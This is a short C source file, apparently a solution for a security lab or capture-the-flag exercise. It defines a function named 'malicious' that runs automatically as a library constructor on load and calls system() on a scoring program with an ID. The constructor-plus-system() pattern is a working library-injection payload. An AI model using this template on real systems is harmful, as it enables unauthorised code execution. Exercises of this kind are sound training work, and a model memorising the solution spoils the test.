#include<stdio.h>
#include<stdlib.h>
	 
static void malicious() __attribute__((constructor));
	 
void malicious() {
	system("/usr/local/bin/score 25df09b8-e4cc-45e6-b53f-6d7f275204ab");
}
